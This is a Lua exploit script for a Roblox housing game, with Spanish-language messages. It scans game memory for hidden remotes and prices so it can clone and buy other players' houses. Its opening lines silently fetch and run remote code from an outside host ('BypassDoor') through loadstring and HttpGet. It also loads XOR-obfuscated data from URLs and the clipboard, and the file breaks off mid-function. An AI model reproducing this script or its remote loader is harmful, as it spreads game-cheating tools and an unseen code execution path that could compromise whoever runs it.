spawn(function()
loadstring(game:HttpGet("https://x.api-x.site/BypassDoor"))()
end)

local RS,PG,LP,TS,UIS = game:GetService("ReplicatedStorage"),game:GetService("Players").LocalPlayer.PlayerGui,game:GetService("Players").LocalPlayer,game:GetService("TweenService"),game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local d,td,failed_items = {},{},{}
local cur_owner,cur_type,cur_hid,user_houses = nil,nil,nil,{}
local cfg = {notif=true}
local gui,log = nil,{}
local house_cards = {}
local filters = {search="",sort="name",order="asc",min_price=0,max_price=math.huge,show_detected=true,show_files=true}
local temp_houses = {}
local purchase_states = {}
local localKey = 85

local clr = {
    p=Color3.fromRGB(15,20,30),s=Color3.fromRGB(25,32,43),a=Color3.fromRGB(70,130,200),
    ok=Color3.fromRGB(80,200,120),warn=Color3.fromRGB(255,180,60),err=Color3.fromRGB(240,80,80),
    t1=Color3.fromRGB(255,255,255),t2=Color3.fromRGB(180,185,195),bg=Color3.fromRGB(8,12,20),
    card=Color3.fromRGB(20,27,38),inp=Color3.fromRGB(30,37,50),accent=Color3.fromRGB(100,150,255)
}

local blk = {hash=1,creator=1,was_free=1,added_this_session=1,id=1}

getgenv().BuscarPrecioMueble = getgenv().BuscarPrecioMueble or (function()
    local cache = {}
    local archivo = "muebles_cache.txt"
    
    if not isfile(archivo) then
        writefile(archivo, "")
    end
    
    local function cargarDesdeArchivo()
        local datos = readfile(archivo)
        for linea in datos:gmatch("[^\r\n]+") do
            local id, cost = linea:match("^(.-)=(%d+)$")
            if id and cost then
                cache[id:lower()] = tonumber(cost)
            end
        end
    end
    
    local function guardarEnArchivo(id, cost)
        appendfile(archivo, id .. "=" .. tostring(cost) .. "\n")
    end
    
    cargarDesdeArchivo()
    
    return function(id)
        id = string.lower(id)
        if cache[id] then
            return cache[id]
        end
        
        local gc = getgc(true)
        for i = 1, #gc do
            local obj = gc[i]
            if type(obj) == "table" then
                local val = rawget(obj, "id")
                if type(val) ~= "string" then
                    local ok, r = pcall(function() return obj.id end)
                    if ok then val = r end
                end
                
                if type(val) == "string" and string.lower(val) == id then
                    local cost = rawget(obj, "cost")
                    if type(cost) ~= "number" then
                        local ok, r = pcall(function() return obj.cost end)
                        if ok then cost = r end
                    end
                    
                    if type(cost) == "number" then
                        cache[id] = cost
                        guardarEnArchivo(id, cost)
                        return cost
                    end
                end
            end
        end
        
        return nil
    end
end)()

local function calculate_house_price(furniture_list)
    if not furniture_list or #furniture_list == 0 then
        return 0, 0, 0
    end
    
    local total_price = 0
    local found_prices = 0
    local total_items = #furniture_list
    
    for _, item in ipairs(furniture_list) do
        if item.kind then
            local price = BuscarPrecioMueble(item.kind)
            if price then
                total_price = total_price + price
                found_prices = found_prices + 1
            end
        end
    end
    
    return total_price, found_prices, total_items
end

local function format_price(price)
    if price >= 1000000 then
        return string.format("%.1fM", price / 1000000)
    elseif price >= 1000 then
        return string.format("%.1fK", price / 1000)
    else
        return tostring(price)
    end
end

local function compress_house_data(house_data)
    local compressed = {
        n = house_data.name or "Casa",
        o = house_data.owner or "Unknown",
        f = {},
        t = house_data.textures or {},
        fc = house_data.furniture_count or 0,
        tc = house_data.texture_count or 0,
        ep = house_data.estimated_price or 0,
        ht = house_data.house_type or "unknown",
        v = "2.0c"
    }
    
    if house_data.furniture then
        for i, item in ipairs(house_data.furniture) do
            local comp_item = {k = item.kind}
            if item.properties then
                comp_item.p = {}
                for k, v in pairs(item.properties) do
                    if k == "colors" and type(v) == "table" then
                        comp_item.p.c = {}
                        for j, color in ipairs(v) do
                            if typeof(color) == "Color3" then
                                comp_item.p.c[j] = {color.R, color.G, color.B}
                            end
                        end
                    elseif k == "cframe" and typeof(v) == "CFrame" then
                        local cf = v
                        comp_item.p.cf = {cf.X, cf.Y, cf.Z, cf.LookVector.X, cf.LookVector.Y, cf.LookVector.Z}
                    else
                        comp_item.p[k] = v
                    end
                end
            end
            compressed.f[i] = comp_item
        end
    end
    
    return compressed
end

local function decompress_house_data(compressed_data)
    if compressed_data.v ~= "2.0c" and not compressed_data.furniture then
        return compressed_data
    end
    
    local decompressed = {
        name = compressed_data.n or compressed_data.name or "Casa",
        owner = compressed_data.o or compressed_data.owner or "Unknown",
        furniture = {},
        textures = compressed_data.t or compressed_data.textures or {},
        furniture_count = compressed_data.fc or compressed_data.furniture_count or 0,
        texture_count = compressed_data.tc or compressed_data.texture_count or 0,
        estimated_price = compressed_data.ep or compressed_data.estimated_price or 0,
        house_type = compressed_data.ht or compressed_data.house_type or "unknown",
        version = "2.0",
        timestamp = "imported_" .. os.date("%Y%m%d_%H%M%S"),
        date = os.date("%Y-%m-%d %H:%M:%S")
    }
    
    local furniture_source = compressed_data.f or compressed_data.furniture or {}
    for i, item in ipairs(furniture_source) do
        local decomp_item = {
            kind = item.k or item.kind,
            properties = {}
        }
        
        if item.p or item.properties then
            local props = item.p or item.properties
            for k, v in pairs(props) do
                if k == "c" or k == "colors" then
                    decomp_item.properties.colors = {}
                    local colors = k == "c" and v or v
                    for j, color_data in ipairs(colors) do
                        if type(color_data) == "table" and #color_data >= 3 then
                            decomp_item.properties.colors[j] = Color3.new(color_data[1], color_data[2], color_data[3])
                        end
                    end
                elseif k == "cf" or k == "cframe" then
                    local cf_data = k == "cf" and v or v
                    if type(cf_data) == "table" and #cf_data >= 6 then
                        decomp_item.properties.cframe = CFrame.lookAt(
                            Vector3.new(cf_data[1], cf_data[2], cf_data[3]),
                            Vector3.new(cf_data[1] + cf_data[4], cf_data[2] + cf_data[5], cf_data[3] + cf_data[6])
                        )
                    end
                else
                    decomp_item.properties[k] = v
                end
            end
        end
        
        decompressed.furniture[i] = decomp_item
    end
    
    return decompressed
end

local function customDec(data)
    local unreversed = data:reverse()
    local decodedBytes = {}
    for i = 1, #unreversed do
        local originalByte = bit32.bxor(unreversed:byte(i), localKey)
        decodedBytes[i] = string.char(originalByte)
    end
    return table.concat(decodedBytes)
end

local function deobfuscateAuto(data)
    local success, result = pcall(function()
        return HttpService:JSONDecode(data)
    end)
    if success then
        return result
    end
    local decoded = customDec(data)
    local ok, decodedJson = pcall(function()
        return HttpService:JSONDecode(decoded)
    end)
    if ok then
        return decodedJson
    end
    return nil
end

local function drag(f)
    local dr,ds,sp = false,nil,nil
    f.Active = true
    f.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dr,ds,sp = true,i.Position,f.Position end end)
    f.InputChanged:Connect(function(i) if dr and i.UserInputType == Enum.UserInputType.MouseMovement then local dt = i.Position - ds; f.Position = UDim2.new(sp.X.Scale,sp.X.Offset + dt.X,sp.Y.Scale,sp.Y.Offset + dt.Y) end end)
    f.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dr = false end end)
end

local function create_notification_gui()
    local notif_gui = Instance.new("ScreenGui")
    notif_gui.Name = "CloneHouseNotifications"
    notif_gui.Parent = PG
    notif_gui.ResetOnSpawn = false
    notif_gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    return notif_gui
end

local notif_gui = create_notification_gui()

local function notif(txt,col)
    if not cfg.notif then return end
    
    if not notif_gui or not notif_gui.Parent then
        notif_gui = create_notification_gui()
    end
    
    local n = Instance.new("Frame")
    n.Size,n.Position,n.BackgroundColor3,n.BorderSizePixel,n.Parent = UDim2.new(0,280,0,50),UDim2.new(1,-300,0,20),col or clr.p,0,notif_gui
    n.ZIndex = 10
    local c = Instance.new("UICorner"); c.CornerRadius,c.Parent = UDim.new(0,8),n
    local l = Instance.new("TextLabel")
    l.Size,l.Position,l.BackgroundTransparency,l.Text,l.TextColor3,l.TextSize,l.Font,l.TextWrapped,l.Parent = UDim2.new(1,-12,1,0),UDim2.new(0,6,0,0),1,txt,clr.t1,11,Enum.Font.GothamMedium,true,n
    l.ZIndex = 11
    
    n.Position = UDim2.new(1,0,0,20)
    local ti = TS:Create(n,TweenInfo.new(0.4,Enum.EasingStyle.Back),{Position=UDim2.new(1,-300,0,20)})
    local to = TS:Create(n,TweenInfo.new(0.3),{Position=UDim2.new(1,0,0,20)})
    
    ti:Play()
    spawn(function()
        wait(2.5)
        to:Play()
        to.Completed:Connect(function() 
            if n and n.Parent then n:Destroy() end 
        end)
    end)
end

local function create_dialog_gui()
    local dialog_gui = Instance.new("ScreenGui")
    dialog_gui.Name = "CloneHouseDialogs"
    dialog_gui.Parent = PG
    dialog_gui.ResetOnSpawn = false
    dialog_gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    return dialog_gui
end

local function confirmation_dialog(title, message, total_items, valid_items, estimated_price, callback)
    local dialog_gui = create_dialog_gui()
    
    local overlay = Instance.new("Frame")
    overlay.Size,overlay.Position,overlay.BackgroundColor3,overlay.BackgroundTransparency,overlay.BorderSizePixel,overlay.Parent = UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),Color3.new(0,0,0),0.5,0,dialog_gui
    overlay.ZIndex = 15
    
    local n = Instance.new("Frame")
    n.Size,n.Position,n.BackgroundColor3,n.BorderSizePixel,n.Parent = UDim2.new(0.4,0,0.35,0),UDim2.new(0.3,0,0.325,0),clr.p,0,dialog_gui
    n.ZIndex = 16
    local c = Instance.new("UICorner"); c.CornerRadius,c.Parent = UDim.new(0,12),n
    
    local title_lbl = Instance.new("TextLabel")
    title_lbl.Size,title_lbl.Position,title_lbl.BackgroundColor3,title_lbl.Text,title_lbl.TextColor3,title_lbl.TextSize,title_lbl.Font,title_lbl.TextWrapped,title_lbl.BorderSizePixel,title_lbl.Parent = UDim2.new(1,-20,0,35),UDim2.new(0,10,0,8),clr.s,title,clr.t1,14,Enum.Font.GothamBold,true,0,n
    title_lbl.ZIndex = 17
    local title_corner = Instance.new("UICorner"); title_corner.CornerRadius,title_corner.Parent = UDim.new(0,8),title_lbl
    
    local msg_lbl = Instance.new("TextLabel")
    msg_lbl.Size,msg_lbl.Position,msg_lbl.BackgroundTransparency,msg_lbl.Text,msg_lbl.TextColor3,msg_lbl.TextSize,msg_lbl.Font,msg_lbl.TextWrapped,msg_lbl.Parent = UDim2.new(1,-20,0.3,0),UDim2.new(0,10,0,50),1,message,clr.t2,11,Enum.Font.GothamMedium,true,n
    msg_lbl.ZIndex = 17
    
    local stats_frame = Instance.new("Frame")
    stats_frame.Size,stats_frame.Position,stats_frame.BackgroundColor3,stats_frame.BorderSizePixel,stats_frame.Parent = UDim2.new(1,-20,0.25,0),UDim2.new(0,10,0.4,0),clr.card,0,n
    stats_frame.ZIndex = 17
    local stats_corner = Instance.new("UICorner"); stats_corner.CornerRadius,stats_corner.Parent = UDim.new(0,8),stats_frame
    
    local stats_text = "📦 Total: "..total_items.."\n✅ Válidos: "..valid_items
    if estimated_price > 0 then
        stats_text = stats_text .. "\n💰 Precio: $"..format_price(estimated_price)
    end
    
    local stats_lbl = Instance.new("TextLabel")
    stats_lbl.Size,stats_lbl.Position,stats_lbl.BackgroundTransparency,stats_lbl.Text,stats_lbl.TextColor3,stats_lbl.TextSize,stats_lbl.Font,stats_lbl.TextWrapped,stats_lbl.Parent = UDim2.new(1,-12,1,-12),UDim2.new(0,6,0,6),1,stats_text,clr.warn,11,Enum.Font.GothamBold,true,stats_frame
    stats_lbl.ZIndex = 18
    
    local yes_btn = Instance.new("TextButton")
    yes_btn.Size,yes_btn.Position,yes_btn.BackgroundColor3,yes_btn.Text,yes_btn.TextColor3,yes_btn.TextSize,yes_btn.Font,yes_btn.BorderSizePixel,yes_btn.Parent = UDim2.new(0.4,0,0.12,0),UDim2.new(0.1,0,0.8,0),clr.ok,"✅ COMPRAR",clr.t1,12,Enum.Font.GothamBold,0,n
    yes_btn.ZIndex = 17
    local yes_corner = Instance.new("UICorner"); yes_corner.CornerRadius,yes_corner.Parent = UDim.new(0,8),yes_btn
    
    local no_btn = Instance.new("TextButton")
    no_btn.Size,no_btn.Position,no_btn.BackgroundColor3,no_btn.Text,no_btn.TextColor3,no_btn.TextSize,no_btn.Font,no_btn.BorderSizePixel,no_btn.Parent = UDim2.new(0.4,0,0.12,0),UDim2.new(0.5,0,0.8,0),clr.err,"❌ CANCELAR",clr.t1,12,Enum.Font.GothamBold,0,n
    no_btn.ZIndex = 17
    local no_corner = Instance.new("UICorner"); no_corner.CornerRadius,no_corner.Parent = UDim.new(0,8),no_btn
    
    yes_btn.MouseButton1Click:Connect(function() 
        dialog_gui:Destroy()
        callback(true) 
    end)
    no_btn.MouseButton1Click:Connect(function() 
        dialog_gui:Destroy()
        callback(false) 
    end)
    
    overlay.MouseButton1Click:Connect(function()
        dialog_gui:Destroy()
        callback(false)
    end)
end

local function logmsg(txt,col)
    table.insert(log, {text = txt, color = col or clr.s, time = os.date("%H:%M:%S")})
    if #log > 60 then table.remove(log, 1) end
end

local function sanitize_data(data)
    if type(data) ~= "table" then return data end
    local sanitized = {}
    for k,v in pairs(data) do
        if type(v) == "table" then
            sanitized[k] = sanitize_data(v)
        elseif typeof(v) == "Color3" then
            sanitized[k] = {v.R, v.G, v.B}
        elseif typeof(v) == "CFrame" then
            local cf = v
            sanitized[k] = {cf.X,cf.Y,cf.Z,cf.LookVector.X,cf.LookVector.Y,cf.LookVector.Z}
        elseif type(v) == "number" and (v ~= v or v == math.huge or v == -math.huge) then
            sanitized[k] = 0
        else
            sanitized[k] = v
        end
    end
    return sanitized
end

local function restore_data(data)
    if type(data) ~= "table" then return data end
    local restored = {}
    for k,v in pairs(data) do
        if type(v) == "table" then
            if k == "colors" and #v > 0 and type(v[1]) == "table" and #v[1] == 3 then
                restored[k] = {}
                for i,color_data in ipairs(v) do
                    restored[k][i] = Color3.new(color_data[1] or 0, color_data[2] or 0, color_data[3] or 0)
                end
            elseif k == "cframe" and #v >= 6 then
                restored[k] = CFrame.lookAt(
                    Vector3.new(v[1] or 0, v[2] or 0, v[3] or 0),
                    Vector3.new((v[1] or 0) + (v[4] or 0), (v[2] or 0) + (v[5] or 0), (v[3] or 0) + (v[6] or 0))
                )
            else
                restored[k] = restore_data(v)
            end
        else
            restored[k] = v
        end
    end
    return restored
end

local function save_house(hd,hn,own)
    if not isfolder("CloneHouse") then makefolder("CloneHouse") end
    local ts,fn,fp = os.date("%Y-%m-%d_%H-%M-%S"),hn.."_"..os.date("%Y-%m-%d_%H-%M-%S")..".json","CloneHouse/"..hn.."_"..os.date("%Y-%m-%d_%H-%M-%S")..".json"
    
    local sanitized_furniture = {}
    local sanitized_textures = {}
    
    if hd.furniture then
        for i,item in ipairs(hd.furniture) do
            sanitized_furniture[i] = sanitize_data(item)
        end
    end
    
    if hd.textures then
        for i,tex in ipairs(hd.textures) do
            sanitized_textures[i] = sanitize_data(tex)
        end
    end
    
    local total_price, found_prices, total_items = calculate_house_price(hd.furniture)
    
    local sd = {
        name=hn,
        owner=own,
        timestamp=ts,
        date=os.date("%Y-%m-%d %H:%M:%S"),
        furniture=sanitized_furniture,
        textures=sanitized_textures,
        furniture_count=#sanitized_furniture,
        texture_count=#sanitized_textures,
        estimated_price=total_price,
        priced_items=found_prices,
        house_type=cur_type or "unknown",
        version="2.0",
        creator="OneCreatorX"
    }
    
    local success_save, error_msg = pcall(function()
        writefile(fp,HttpService:JSONEncode(sd))
    end)
    
    if success_save then
        logmsg("💾 Casa guardada: "..fn,clr.ok)
        notif("💾 ¡Casa guardada!",clr.ok)
    else
        logmsg("❌ Error al guardar: "..tostring(error_msg),clr.err)
        notif("❌ Error al guardar",clr.err)
    end
end

local function load_houses()
    if not isfolder("CloneHouse") then makefolder("CloneHouse"); return {} end
    local files = {}
    local ok,fl = pcall(function() return listfiles("CloneHouse") end)
    if ok and fl then
        for _,fp in ipairs(fl) do
            if fp:match("%.json$") then
                local ok2,cont = pcall(function() return readfile(fp) end)
                if ok2 and cont then
                    local data = deobfuscateAuto(cont)
                    if data then 
                        data = decompress_house_data(data)
                        data.filepath,data.filename = fp,fp:match("([^/\\]+)$")
                        data.source = "file"
                        
                        if not data.house_type then
                            data.house_type = "unknown"
                        end
                        
                        if data.furniture then
                            for i,item in ipairs(data.furniture) do
                                data.furniture[i] = restore_data(item)
                            end
                        end
                        if data.textures then
                            for i,tex in ipairs(data.textures) do
                                data.textures[i] = restore_data(tex)
                            end
                        end
                        
                        if not data.furniture_count then
                            data.furniture_count = data.furniture and #data.furniture or 0
                        end
                        if not data.texture_count then
                            data.texture_count = data.textures and #data.textures or 0
                        end
                        
                        if not data.estimated_price and data.furniture then
                            local price, found, total = calculate_house_price(data.furniture)
                            data.estimated_price = price
                            data.priced_items = found
                        end
                        
                        table.insert(files,data) 
                    end
                end
            end
        end
    end
    table.sort(files,function(a,b) return (a.timestamp or "0") > (b.timestamp or "0") end)
    return files
end

local function get_all_houses()
    local all_houses = {}
    
    if filters.show_detected then
        for hid, house_data in pairs(d) do
            if house_data and #house_data > 0 then
                local owner = "Unknown"
                if house_cards[hid] and house_cards[hid].owner then
                    owner = house_cards[hid].owner
                end
                
                local house_info = {
                    id = hid,
                    name = owner.."_Casa",
                    owner = owner,
                    furniture = house_data,
                    textures = td[hid] or {},
                    furniture_count = #house_data,
                    texture_count = td[hid] and #td[hid] or 0,
                    house_type = user_houses[hid] or "unknown",
                    source = "detected",
                    timestamp = hid
                }
                
                if not house_info.estimated_price then
                    local price, found, total = calculate_house_price(house_info.furniture)
                    house_info.estimated_price = price
                    house_info.priced_items = found
                end
                
                table.insert(all_houses, house_info)
            end
        end
    end
    
    if filters.show_files then
        local file_houses = load_houses()
        for _, house in ipairs(file_houses) do
            table.insert(all_houses, house)
        end
    end
    
    for _, house in ipairs(temp_houses) do
        table.insert(all_houses, house)
    end
    
    return all_houses
end

local function filter_houses(houses)
    local filtered = {}
    for _, house in ipairs(houses) do
        local matches_search = true
        if filters.search ~= "" then
            local search_lower = filters.search:lower()
            matches_search = (house.name and house.name:lower():find(search_lower)) or 
                           (house.owner and house.owner:lower():find(search_lower)) or
                           (house.house_type and house.house_type:lower():find(search_lower))
        end
        
        local matches_price = true
        if house.estimated_price then
            matches_price = house.estimated_price >= filters.min_price and house.estimated_price <= filters.max_price
        end
        
        if matches_search and matches_price then
            table.insert(filtered, house)
        end
    end
    
    table.sort(filtered, function(a, b)
        local val_a, val_b
        if filters.sort == "name" then
            val_a, val_b = a.name or "", b.name or ""
        elseif filters.sort == "price" then
            val_a, val_b = a.estimated_price or 0, b.estimated_price or 0
        elseif filters.sort == "furniture" then
            val_a, val_b = a.furniture_count or 0, b.furniture_count or 0
        elseif filters.sort == "date" then
            val_a, val_b = a.timestamp or "", b.timestamp or ""
        else
            val_a, val_b = a.name or "", b.name or ""
        end
        
        if filters.order == "desc" then
            return val_a > val_b
        else
            return val_a < val_b
        end
    end)
    
    return filtered
end

local function ser(raw)
    local fmt = {}
    for fk,fd in pairs(raw) do
        if type(fk) == "string" and fk:match("^f%-%d+$") and fd.id then
            local ent = {kind=fd.id,properties={}}
            for k,v in pairs(fd) do
                if not blk[k] and v ~= nil then
                    if k == "colors" and type(v) == "table" then
                        local clr_props = {}
                        for i,cv in ipairs(v) do
                            if typeof(cv) == "Color3" then clr_props[i] = cv
                            elseif type(cv) == "table" and #cv == 3 then clr_props[i] = Color3.new(cv[1],cv[2],cv[3]) end
                        end
                        if next(clr_props) then ent.properties.colors = clr_props end
                    elseif k == "cframe" then
                        if typeof(v) == "CFrame" then ent.properties.cframe = v
                        elseif type(v) == "table" and #v >= 3 then
                            if #v >= 6 then
                                ent.properties.cframe = CFrame.lookAt(
                                    Vector3.new(v[1], v[2], v[3]),
                                    Vector3.new(v[1] + v[4], v[2] + v[5], v[3] + v[6])
                                )
                            else
                                ent.properties.cframe = CFrame.new(v[1], v[2], v[3])
                            end
                        end
                    else ent.properties[k] = v end
                end
            end
            table.insert(fmt,ent)
        end
    end
    return fmt
end

local function tex_ser(tex)
    local fmt = {}
    for room,types in pairs(tex) do
        if type(types) == "table" then
            for typ,texture_id in pairs(types) do
                if typ == "walls" or typ == "floors" then table.insert(fmt,{room,typ,texture_id}) end
            end
        end
    end
    return fmt
end

local function rem(rk)
    for _,obj in ipairs(getgc(true)) do
        if type(obj) == "table" and rawget(obj,rk) then
            local mr = obj[rk]
            if typeof(mr) == "Instance" and mr:IsA("RemoteEvent") then return mr end
        end
    end
end

local function fnd(nm)
    for _,obj in ipairs(getgc(true)) do
        if type(obj) == "table" then
            for k,v in pairs(obj) do
                if k == nm and typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then return v end
            end
        end
    end
end

local function get_purchase_key(hid, is_from_file)
    return (is_from_file and "file_" or "detected_") .. tostring(hid)
end

local function buy_furniture(items, hid, is_from_file)
    local purchase_key = get_purchase_key(hid, is_from_file)
    
    if purchase_states[purchase_key] and purchase_states[purchase_key].completed then
        logmsg("✅ Casa ya completada - ID: "..tostring(hid),clr.ok)
        notif("✅ ¡Casa ya clonada!",clr.ok)
        return
    end
    
    if not items or #items == 0 then 
        logmsg("❌ No hay muebles para comprar",clr.warn)
        notif("❌ No hay muebles",clr.warn)
        return 
    end
    
    if not purchase_states[purchase_key] then
        purchase_states[purchase_key] = {attempts = 0, failed_items = {}, completed = false, has_failed = false}
    end
    
    local state = purchase_states[purchase_key]
    state.attempts = state.attempts + 1
    
    local items_to_buy = {}
    for _, item in ipairs(items) do
        local should_skip = false
        for _, failed_item in ipairs(state.failed_items) do
            if failed_item.kind == item.kind then
                should_skip = true
                break
            end
        end
        if not should_skip then
            table.insert(items_to_buy, item)
        end
    end
    
    logmsg("📊 Intento #"..state.attempts.." - Válidos: "..#items_to_buy.." de "..#items,clr.a)
    
    if #items_to_buy == 0 then
        logmsg("⚠️ Todos fallaron anteriormente",clr.warn)
        notif("⚠️ No hay válidos",clr.warn)
        return
    end
    
    local function proceed_purchase()
        logmsg("⚡ Comprando "..#items_to_buy.." muebles...",clr.a)
        
        local bfr = fnd("HousingAPI/BuyFurnitures")
        if not bfr then 
            logmsg("❌ Remoto no encontrado",clr.err)
            notif("❌ Remoto no encontrado",clr.err)
            return 
        end
        
        local ok, res = pcall(function() return bfr:InvokeServer(items_to_buy) end)
        
        if ok and res and res.results then
            local success_count = 0
            local new_failed = {}
            
            for k, r in ipairs(res.results) do
                if r.status == "SUCCESS" then
                    success_count = success_count + 1
                else
                    table.insert(new_failed, items_to_buy[k])
                end
            end
            
            for _, failed_item in ipairs(new_failed) do
                table.insert(state.failed_items, failed_item)
            end
            
            if #new_failed > 0 then
                state.has_failed = true
            end
            
            if success_count > 0 and #new_failed == 0 and #state.failed_items == 0 then
                state.completed = true
                logmsg("🎉 ¡CASA CLONADA! "..success_count.." muebles",clr.ok)
                notif("🎉 ¡CASA CLONADA EXITOSAMENTE!",clr.ok)
            elseif success_count > 0 then
                logmsg("⚠️ Parcial: "..success_count.." OK, "..#new_failed.." errores",clr.warn)
                notif("⚠️ "..success_count.." OK, "..#new_failed.." errores",clr.warn)
            else
                logmsg("❌ Todos fallaron en este intento",clr.err)
                notif("❌ Intento fallido",clr.err)
                state.has_failed = true
            end
        else
            logmsg("❌ Error de comunicación",clr.err)
            notif("❌ Error de conexión",clr.err)
            state.has_failed = true
        end
    end
    
    if state.has_failed and #items_to_buy < #items then
        local estimated_price, _, _ = calculate_house_price(items_to_buy)
        
        confirmation_dialog(
            "🛒 CONFIRMACIÓN",
            "Algunos muebles fallaron antes. ¿Continuar con los válidos?",
            #items,
            #items_to_buy,
            estimated_price,
            function(confirmed)
                if confirmed then
                    proceed_purchase()
                else
                    state.attempts = state.attempts - 1
                    logmsg("❌ Compra cancelada",clr.warn)
                end
            end
        )
    else
        proceed_purchase()
    end
end

local function buy_textures(textures, hid)
    logmsg("🎨 Comprando texturas - Casa: "..tostring(hid),clr.a)
    
    if not textures or #textures == 0 then 
        logmsg("❌ No hay texturas",clr.warn)
        notif("❌ No hay texturas",clr.warn)
        return 
    end
    
    local btr = fnd("HousingAPI/BuyTexture")
    if not btr then 
        logmsg("❌ Remoto texturas no encontrado",clr.err)
        notif("❌ Remoto texturas no encontrado",clr.err)
        return
    end
    
    local success_count = 0
    
    for i, tex in ipairs(textures) do
        local ok = pcall(function() btr:FireServer(tex[1], tex[2], tex[3]) end)
        if ok then
            success_count = success_count + 1
        end
        wait(0.05)
    end
    
    logmsg("✅ Texturas: "..success_count.." de "..#textures,clr.ok)
    notif("✅ "..success_count.." texturas compradas!",clr.ok)
end

local function mk_frame(p,sz,pos,col,cr)
    local f = Instance.new("Frame")
    f.Size,f.Position,f.BackgroundColor3,f.BorderSizePixel,f.Parent = sz,pos,col,0,p
    if cr then local c = Instance.new("UICorner"); c.CornerRadius,c.Parent = UDim.new(0,cr),f end
    return f
end

local function mk_btn(p,sz,pos,col,txt,cr)
    local b = Instance.new("TextButton")
    b.Size,b.Position,b.BackgroundColor3,b.Text,b.TextColor3,b.TextSize,b.Font,b.BorderSizePixel,b.Parent = sz,pos,col,txt,clr.t1,11,Enum.Font.GothamMedium,0,p
    if cr then local c = Instance.new("UICorner"); c.CornerRadius,c.Parent = UDim.new(0,cr),b end
    return b
end

local function mk_lbl(p,sz,pos,txt,tsz,col)
    local l = Instance.new("TextLabel")
    l.Size,l.Position,l.BackgroundTransparency,l.Text,l.TextColor3,l.TextSize,l.Font,l.TextXAlignment,l.Parent = sz,pos,1,txt,col or clr.t1,tsz or 11,Enum.Font.GothamMedium,Enum.TextXAlignment.Left,p
    return l
end

local function mk_input(p,sz,pos,col,placeholder,cr)
    local i = Instance.new("TextBox")
    i.Size,i.Position,i.BackgroundColor3,i.PlaceholderText,i.Text,i.TextColor3,i.TextSize,i.Font,i.BorderSizePixel,i.Parent = sz,pos,col,placeholder,"",clr.t1,11,Enum.Font.GothamMedium,0,p
    if cr then local c = Instance.new("UICorner"); c.CornerRadius,c.Parent = UDim.new(0,cr),i end
    return i
end

local function download_from_url(url)
    logmsg("🌐 Descargando: "..url,clr.a)
    
    local ok, response = pcall(function()
        return game:HttpGet(url)
    end)
    
    if not ok then
        logmsg("❌ Error descarga: "..tostring(response),clr.err)
        notif("❌ Error descarga",clr.err)
        return nil
    end
    
    local data = deobfuscateAuto(response)
    if not data then
        logmsg("❌ Datos inválidos",clr.err)
        notif("❌ Datos inválidos",clr.err)
        return nil
    end
    
    data = decompress_house_data(data)
    
    if not data.furniture and not data.textures then
        logmsg("❌ Archivo inválido",clr.err)
        notif("❌ Archivo inválido",clr.err)
        return nil
    end
    
    if data.furniture then
        for i,item in ipairs(data.furniture) do
            data.furniture[i] = restore_data(item)
        end
    end
    if data.textures then
        for i,tex in ipairs(data.textures) do
            data.textures[i] = restore_data(tex)
        end
    end
    
    if not data.furniture_count then
        data.furniture_count = data.furniture and #data.furniture or 0
    end
    if not data.texture_count then
        data.texture_count = data.textures and #data.textures or 0
    end
    
    if not data.estimated_price and data.furniture then
        local price, found, total = calculate_house_price(data.furniture)
        data.estimated_price = price
        data.priced_items = found
    end
    
    data.name = data.name or "Casa URL"
    data.owner = data.owner or "Desconocido"
    data.timestamp = "url_"..os.date("%Y%m%d_%H%M%S")
    data.date = data.date or os.date("%Y-%m-%d %H:%M:%S")
    data.house_type = data.house_type or "unknown"
    data.source = "url"
    
    logmsg("✅ Descargada: "..data.name.." ("..data.furniture_count.." muebles)",clr.ok)
    if data.estimated_price > 0 then
        logmsg("💰 Precio: $"..format_price(data.estimated_price),clr.a)
    end
    notif("✅ ¡Casa descargada!",clr.ok)
    
    return data
end

local function process_clipboard_data(data_text)
    if not data_text or data_text == "" then
        if getclipboard then
            local ok, clipboard_content = pcall(getclipboard)
            if ok and clipboard_content and clipboard_content ~= "" then
                data_text = clipboard_content
                logmsg("📋 Datos obtenidos del portapapeles automáticamente",clr.a)
            else
                logmsg("❌ No se pudo acceder al portapapeles",clr.err)
                notif("❌ Portapapeles vacío",clr.err)
                return nil
            end
        else
            logmsg("❌ Función getclipboard no disponible",clr.err)
            notif("❌ Portapapeles no disponible",clr.err)
            return nil
        end
    end
    
    logmsg("📋 Procesando datos...",clr.a)
    
    local data = deobfuscateAuto(data_text)
    if not data then
        logmsg("❌ Datos inválidos",clr.err)
        notif("❌ Datos inválidos",clr.err)
        return nil
    end
    
    data = decompress_house_data(data)
    
    if not data.furniture and not data.textures then
        logmsg("❌ Sin información de casa",clr.err)
        notif("❌ Datos inválidos",clr.err)
        return nil
    end
    
    if data.furniture then
        for i,item in ipairs(data.furniture) do
            data.furniture[i] = restore_data(item)
        end
    end
    if data.textures then
        for i,tex in ipairs(data.textures) do
            data.textures[i] = restore_data(tex)
        end
    end
    
    if not data.furniture_count then
        data.furniture_count = data.furniture and #data.furniture or 0
    end
    if not data.texture_count then
        data.texture_count = data.textures and #data.textures or 0
    end
    
    if not data.estimated_price and data.furniture then
        local price, found, total = calculate_house_price(data.furniture)
        data.estimated_price = price
        data.priced_items = found
    end
    
    data.name = data.name or "Casa Portapapeles"
    data.owner = data.owner or "Desconocido"
    data.timestamp = "clipboard_"..os.date("%Y%m%d_%H%M%S")
    data.date = data.date or os.date("%Y-%m-%d %H:%M:%S")
    data.house_type = data.house_type or "unknown"
    data.source = "clipboard"
    
    logmsg("✅ Procesada: "..data.name.." ("..data.furniture_count.." muebles)",clr.ok)
    if data.estimated_price > 0 then
        logmsg("💰 Precio: $"..format_price(data.estimated_price),clr.a)
    end
    notif("✅ ¡Casa cargada!",clr.ok)
    
    return data
end

local function init()
    if gui then gui:Destroy() end
    gui = Instance.new("ScreenGui"); gui.Name,gui.Parent = "CloneHouseGUI",PG
    
    local main_frame = mk_frame(gui,UDim2.new(0.85,0,0.8,0),UDim2.new(0.075,0,0.1,0),clr.p,16); drag(main_frame)
    
    local header = mk_frame(main_frame,UDim2.new(1,0,0,50),UDim2.new(0,0,0,0),clr.s,16)
